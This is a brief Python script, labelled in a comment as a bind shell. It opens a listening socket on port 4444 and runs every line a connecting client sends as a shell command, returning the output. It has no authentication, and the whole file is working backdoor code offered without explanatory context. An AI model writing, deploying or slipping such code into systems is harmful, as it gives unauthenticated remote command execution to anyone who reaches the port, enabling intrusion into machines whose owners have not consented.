import socket
import subprocess
# bind shell 

def send_cmd(cmd):
    out = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return out.stdout
def main():
    port = 4444 # change the port if you want  
    ip = "127.0.0.1"
    s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
    s.bind((ip,port))
    s.listen(4)
    client, addr = s.accept()

    while True:
        data = []
        recv = client.recv(2048)
        data.append(recv)

        while len(recv) != 0 and chr(recv[-1]) != "\n":
            recv = client.recv(2084)
            data.append(recv)
        
        cmd = (b''.join(data)).decode()[:-1]

        if cmd.lower() == 'exit':
            client.close()
            break

        out = send_cmd(cmd)
        client.sendall(out)
if __name__ == "__main__":
     main()
